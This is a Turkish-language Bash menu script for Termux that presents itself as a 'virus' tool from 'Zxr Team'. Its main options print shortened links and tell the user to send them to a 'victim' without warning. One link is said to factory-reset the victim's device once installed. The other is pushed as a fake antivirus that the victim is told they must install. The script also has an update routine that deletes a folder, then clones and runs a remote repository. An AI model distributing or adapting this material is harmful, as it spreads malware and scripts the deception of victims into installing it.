# A tool by nitro from www.noob-hackers.com

# Be a unique person not copy cat

# Colours

#-----------------

red="\e[91m"

rset="\e[0m"

grn="\e[92m"

ylo="\e[93m"

blue="\e[94m"

cyan="\e[96m"

pink="\e[95m"

#-----------------

# scripting start

banner(){

clear

echo -e '\e[93m       

██╗   ██╗    ██╗    ██████╗     ██╗   ██╗    ███████╗
██║   ██║    ██║    ██╔══██╗    ██║   ██║    ██╔════╝
██║   ██║    ██║    ██████╔╝    ██║   ██║    ███████╗
╚██╗ ██╔╝    ██║    ██╔══██╗    ██║   ██║    ╚════██║
 ╚████╔╝     ██║    ██║  ██║    ╚██████╔╝    ███████║
  ╚═══╝      ╚═╝    ╚═╝  ╚═╝     ╚═════╝     ╚══════╝

                                                           

            Developed by Devran

'

echo " " 

echo -e "$red           ▶Devran tarafından$grn geliştirildi$red◀$rset"

echo -e "$red                    ⫸$ylo Zxr Team$red ⫷$rset"

echo 

# Functions

echo " "

echo " "

}

baner1(){

clear

echo -e '\e[93m               

██╗   ██╗    ██╗    ██████╗     ██╗   ██╗    ███████╗
██║   ██║    ██║    ██╔══██╗    ██║   ██║    ██╔════╝
██║   ██║    ██║    ██████╔╝    ██║   ██║    ███████╗
╚██╗ ██╔╝    ██║    ██╔══██╗    ██║   ██║    ╚════██║
 ╚████╔╝     ██║    ██║  ██║    ╚██████╔╝    ███████║
  ╚═══╝      ╚═╝    ╚═╝  ╚═╝     ╚═════╝     ╚══════╝

                                                           

             Developed by Devran 

'

echo " " 

echo -e "$red      ▶Devran tarafından$grn düzenlendi$red◀$rset"

echo -e "$red             ⫸$ylo Zxr Team$red ⫷$rset"

echo 

# Functions

echo " "

echo " "

}

menu(){

echo -e "$grn             ＞＞＞＞>>>＞$ylo [Seçenekler]$grn ＜<<<＜＜＜＜$rset"

echo " "

echo " "

echo -e "$red                        ➡$cyan [\e[92m1\e[96m] Şimdi enfekte(virüs) et"

echo -e "$red                        ➡$cyan [\e[92m2\e[96m] Antivirüs linki"

echo -e "$red                        ➡$cyan [\e[92m3\e[96m] Hakkında"

echo -e "$red                        ➡$cyan [\e[92m4\e[96m] Güncelleme script "

echo -e "$red                        ➡$cyan [\e[92m5\e[96m] Telegram kanalımıza katıl"

echo -e "$red                        ➡$cyan [\e[92m6\e[96m] Github adresi"

echo -e "$red                        ➡$cyan [\e[92m7\e[96m] Çıkış"

echo " "

echo " "

echo -e "$grn               >＞＞＞＞＞$ylo [SEÇ]$grn ＜＜＜＜＜<$rset"

echo " "

echo -ne "\e[92m#SEÇENEK SEÇ\e[92m: "

read optnz

if [ $optnz = "1" ];

then 

clear

virus

elif [ $optnz = "2" ];

then 

clear

save

elif [ $optnz = "3" ];

then 

clear

about

elif [ $optnz = "4" ];

then 

clear

upd

elif [ $optnz = "5" ];

then 

clear

am start -a android.intent.action.VIEW -d https://t.me/zxrsohpet > /dev/null 2>&1

banner

menu

elif [ $optnz = "6" ];

then 

clear

am start -a android.intent.action.VIEW -d https://github.com/devran6606/ > /dev/null 2>&1

banner

menu

elif [ $optnz = "7" ];

then 

clear 

exit 1

else 

clear

echo "sizi termux menüsüne yönlendirdim eğer hata verirse 

yapmanız gerekenler:

cd

cd virus

bash virus.sh

"

exit

fi

}

virus(){

################

clear

echo

echo -e '\e[92m 

███████╗    ██╗  ██╗    ██████╗                 
╚══███╔╝    ╚██╗██╔╝    ██╔══██╗                
  ███╔╝      ╚███╔╝     ██████╔╝                
 ███╔╝       ██╔██╗     ██╔══██╗                
███████╗    ██╔╝ ██╗    ██║  ██║                
╚══════╝    ╚═╝  ╚═╝    ╚═╝  ╚═╝ '

echo " "

echo -e "\e[91m 😈  Aşağıdaki bağlantıyı kopyalayın ve kurbanınıza gönderin ve

ona hiçbir şey söyleme. onun içine yüklediğinde

cihaz fabrika ayarlarına sıfırlanacak ve çok daha fazlası olacak.

                                👇👇👇

         \e[92mL1NKLER :- \e[96mhttps://bit.ly/3ild93L
                    \e[91m

                                 👆👆👆

Birilerine zarar vermek için değil sadece eğlence amaçlı kullanın 😇✌️.

Ve herhangi bir kayıptan kanalımız sorumlu değildir.

bu komut dosyası ile başkalarına yaparsınız."

echo

echo -ne "\e[92m Çıkmak için enter : "

read exitz

if [ $exitz = "exit" ];

then 

clear

banner

menu

else 

clear

banner

menu

fi

}

save(){

clear

echo

echo -e '\e[92m 

███████╗    ██╗  ██╗    ██████╗                 
╚══███╔╝    ╚██╗██╔╝    ██╔══██╗                
  ███╔╝      ╚███╔╝     ██████╔╝                
 ███╔╝       ██╔██╗     ██╔══██╗                
███████╗    ██╔╝ ██╗    ██║  ██║                
╚══════╝    ╚═╝  ╚═╝    ╚═╝  ╚═╝ '

echo " "

echo " "

echo -e "\e[93m  Aşağıdaki bağlantıyı kopyalayın ve kurbanınıza gönderin ve ona söyleyin

bu uygulamayı yüklemesi gerektiğini, aksi takdirde

cihaz kurtarılmayacak.(Antivirüs)

                    👇👇👇

        \e[92mL1NK :- \e[96mhttps://bit.ly/3fX8ljZ\e[93m

                    👆👆👆

Birilerine zarar vermek için değil sadece eğlence amaçlı kullanın 😇✌️.

Ve kanalımız hiçbir şekilde sorumlu değildir.

Bu komut dosyasıyla başkalarına yaptığınız kayıp."

echo

echo -ne "\e[92m Çıkmak için enter : "

read exitz

if [ $exitz = "exit" ];

then 

clear

banner

menu

else 

clear 

banner

menu

fi

}

about(){

clear

echo -e '\e[91m 

███████╗    ██╗  ██╗    ██████╗                 
╚══███╔╝    ╚██╗██╔╝    ██╔══██╗                
  ███╔╝      ╚███╔╝     ██████╔╝                
 ███╔╝       ██╔██╗     ██╔══██╗                
███████╗    ██╔╝ ██╗    ██║  ██║                
╚══════╝    ╚═╝  ╚═╝    ╚═╝  ╚═╝

'

echo -e "\e[93m                  Merhaba"

echo -e "\e[93m                 Ben Devran"

echo -e "\e[93m             ZXR TEAM ekibindeyim"

echo -e "\e[93m            BU TOOLSU BEĞENİRSENİZ"

echo -e "\e[93m          TELEGRAM GRUBUMUZA GELEBİLİRSİNİZ"

echo -e "\e[93m        WhatsApp iletişim: \e[92m https://wa.me/18774668024"

echo -e "\e[93m        Telegram adresimiz:\e[92m https://t.me/zxrsohpet\e[0m"

echo -e "\e[92m                Görüşürüz.............." 

echo ""

echo -e "\e[96m        Çıkmak için enter :"

read exitz

if [ $exitz = "exit" ];

then 

clear

banner

menu

else 

clear

banner

menu

fi

}

upd(){

if [ -d "$HOME/virus" ];

then

cd $HOME

rm -rf virus

elif [ -d "$HOME/virus" ];

then

cd $HOME

rm -rf virus

else

echo

exit 1

fi

cd $HOME

sleep 1

echo -e "         \e[96m GÜNCELLEME DEVAM EDİYOR, LÜTFEN BİRAZ BEKLEYİNİZ...!\e[0m"

echo

printf "                     \e[96m["

# While process is running...

while git clone https://github.com/devran6606/virus/ 2> /dev/null; do 

    printf  "\e[92m▓▓▓▓▓▓▓▓▓▓▓▓▓\e[0m"

    sleep 1

done

printf "\e[96m]\e[0m"

echo

echo

echo

printf "\e[96m           GÜNCELLEME BAŞARILI (SON SÜRÜM)..!\e[0m"

sleep 2.0

cd $HOME

cd virus 

clear

bash virus.sh

}

vid(){

FILE=$HOME/virus/

if [ -f "$FILE" ]; then

pop

else

echo

fi

}

banner

menu
